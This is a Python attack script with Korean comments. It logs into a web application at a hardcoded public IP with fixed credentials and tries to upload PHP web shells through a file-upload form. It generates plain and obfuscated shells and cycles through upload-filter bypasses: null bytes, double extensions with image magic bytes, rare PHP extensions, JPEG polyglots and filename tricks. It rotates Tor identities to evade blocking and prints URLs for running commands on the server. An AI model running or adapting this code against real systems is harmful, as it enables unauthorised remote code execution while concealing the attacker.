#!/usr/bin/env python3
"""
궁극의 파일 업로드 우회 스크립트
- 모든 우회 기법을 순차적으로 시도
- Tor Identity 자동 변경
- 다양한 확장자, MIME type, 인코딩 조합
"""

import requests
import time
import random
import subprocess
import sys

class UltimateUploadBypass:
    def __init__(self, target_ip, use_tor=True):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.use_tor = use_tor
        self.session = None
        self.success_files = []

    def renew_tor_identity(self):
        """Tor identity 변경 (새 IP 받기)"""
        if not self.use_tor:
            return

        print("\n[*] Tor Identity 변경 중...")
        try:
            # 방법 1: control port
            subprocess.run(
                ['bash', '-c', 'echo -e \'AUTHENTICATE ""\nSIGNAL NEWNYM\nQUIT\' | nc 127.0.0.1 9051'],
                capture_output=True,
                timeout=5
            )
            print("[+] Tor Identity 변경 완료")
            time.sleep(3)  # 새 circuit 대기
        except:
            print("[!] Tor Identity 변경 실패 (계속 진행)")

    def create_session(self):
        """새 세션 생성"""
        self.session = requests.Session()

        if self.use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            ])
        })

    def login(self):
        """로그인"""
        print("\n[*] 로그인...")
        data = {'username': 'alice', 'password': 'alice2024'}

        try:
            resp = self.session.post(
                f"{self.base_url}/login.php",
                data=data,
                allow_redirects=True,
                timeout=15
            )

            if 'index.php' in resp.url:
                print("[+] 로그인 성공")
                return True
        except:
            pass

        print("[-] 로그인 실패")
        return False

    def generate_payloads(self):
        """다양한 웹쉘 페이로드 생성"""
        timestamp = int(time.time())
        rand_id = random.randint(1000, 9999)

        # 웹쉘 코드들
        webshells = [
            # 1. 최소 웹쉘
            b'<?php system($_GET[x]);?>',

            # 2. 난독화 버전
            b'<?php $f=base64_decode("c2hlbGxfZXhlYw==");echo $f($_GET[x]." 2>&1");?>',

            # 3. assert 버전
            b'<?php @assert($_GET[x]);?>',

            # 4. create_function
            b'<?php $f=create_function("",$_GET[x]);$f();?>',

            # 5. preg_replace
            b'<?php @preg_replace("/.*/e",$_GET[x],"");?>',
        ]

        selected_shell = random.choice(webshells)

        # 매직 바이트들
        magic_bytes = {
            'jpeg': b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46',
            'png': b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A',
            'gif': b'GIF89a',
        }

        payloads = []

        # === 전략 1: NULL byte injection ===
        for ext in ['jpg', 'png', 'gif']:
            payloads.append({
                'name': f'shell_{rand_id}.php%00.{ext}',
                'content': selected_shell,
                'type': f'image/{ext}',
                'strategy': 'NULL byte'
            })

        # === 전략 2: 대소문자 혼합 ===
        payloads.extend([
            {
                'name': f'data_{rand_id}.PhP',
                'content': selected_shell,
                'type': 'application/octet-stream',
                'strategy': '대소문자 혼합'
            },
            {
                'name': f'run_{rand_id}.pHp',
                'content': selected_shell,
                'type': 'text/plain',
                'strategy': '대소문자 혼합'
            },
        ])

        # === 전략 3: 더블 확장자 + 매직바이트 ===
        for img_type, magic in magic_bytes.items():
            payloads.append({
                'name': f'photo_{rand_id}.{img_type}.php',
                'content': magic + b'\n' + selected_shell,
                'type': f'image/{img_type}',
                'strategy': f'더블확장자+매직바이트({img_type})'
            })

        # === 전략 4: 희귀한 PHP 확장자 ===
        rare_exts = ['php3', 'php4', 'php5', 'phtml', 'pht', 'phps']
        for ext in rare_exts:
            payloads.append({
                'name': f'code_{rand_id}.{ext}',
                'content': selected_shell,
                'type': 'application/octet-stream',
                'strategy': f'희귀 확장자 (.{ext})'
            })

        # === 전략 5: 순수 이미지 + PHP (polyglot) ===
        # 실제 유효한 JPEG + PHP
        jpeg_1x1 = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00\x43\x00\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x00\x01\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00\xBF\x80\x00\xFF\xD9'
        payloads.append({
            'name': f'avatar_{rand_id}.jpg',
            'content': jpeg_1x1 + b'\n' + selected_shell + b'\n',
            'type': 'image/jpeg',
            'strategy': 'JPEG Polyglot'
        })

        # === 전략 6: UTF-8 BOM ===
        payloads.append({
            'name': f'index_{rand_id}.php',
            'content': b'\xEF\xBB\xBF' + selected_shell,  # UTF-8 BOM
            'type': 'text/plain',
            'strategy': 'UTF-8 BOM'
        })

        # === 전략 7: 공백 추가 ===
        payloads.extend([
            {
                'name': f'test_{rand_id}.php ',  # 끝에 공백
                'content': selected_shell,
                'type': 'text/plain',
                'strategy': '파일명 끝 공백'
            },
            {
                'name': f' file_{rand_id}.php',  # 앞에 공백
                'content': selected_shell,
                'type': 'text/plain',
                'strategy': '파일명 앞 공백'
            },
        ])

        # === 전략 8: 특수문자 ===
        payloads.append({
            'name': f'sys;tem_{rand_id}.php',
            'content': selected_shell,
            'type': 'application/x-php',
            'strategy': '파일명 특수문자'
        })

        return payloads

    def upload_file(self, payload):
        """파일 업로드 시도"""
        try:
            files = {
                'file': (payload['name'], payload['content'], payload['type'])
            }

            resp = self.session.post(
                f"{self.base_url}/upload.php",
                files=files,
                timeout=15
            )

            if resp.status_code == 200:
                if '성공' in resp.text or 'success' in resp.text.lower():
                    return True, "업로드 성공"
            elif resp.status_code == 403:
                return False, "403 Forbidden"
            else:
                return False, f"HTTP {resp.status_code}"

        except Exception as e:
            return False, str(e)[:50]

        return False, "알 수 없는 오류"

    def run(self):
        """메인 실행"""
        print(f"\n[*] 타겟: {self.target_ip}")
        print(f"[*] Tor: {'사용' if self.use_tor else '미사용'}")

        payloads = self.generate_payloads()
        print(f"[*] 생성된 페이로드: {len(payloads)}개\n")

        for i, payload in enumerate(payloads, 1):
            print(f"[{i}/{len(payloads)}] {payload['strategy']} - {payload['name']}")

            # 매 5회마다 Tor identity 변경
            if i % 5 == 0:
                self.renew_tor_identity()

            # 새 세션 생성
            self.create_session()

            # 로그인
            if not self.login():
                print("[!] 로그인 실패, 다음 시도...")
                time.sleep(5)
                continue

            time.sleep(random.uniform(2, 4))

            # 업로드 시도
            success, msg = self.upload_file(payload)

            if success:
                print(f"[+] ✅ 성공! {msg}")
                print(f"[+] 업로드된 파일: uploads/{payload['name']}")
                self.success_files.append(payload['name'])

                # LFI 테스트 URL 제공
                print(f"\n[!] 테스트 URL:")
                print(f"    http://{self.target_ip}/file.php?name=uploads/{payload['name']}&x=id")
                print(f"    http://{self.target_ip}/uploads/{payload['name']}?x=id")

            else:
                print(f"[-] 실패: {msg}")

            time.sleep(random.uniform(3, 6))

        # 최종 요약
        print(f"\n[+] 완료: 성공 {len(self.success_files)}개 / 총 {len(payloads)}개")

        if self.success_files:
            print(f"\n[+] 업로드 성공:")
            for f in self.success_files:
                print(f"    uploads/{f}")
        else:
            print("\n[-] 모든 시도 실패")

def main():
    target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"
    use_tor = input("Tor 사용? (Y/n): ").strip().lower() != 'n'

    bypass = UltimateUploadBypass(target_ip, use_tor)
    bypass.run()

if __name__ == "__main__":
    main()
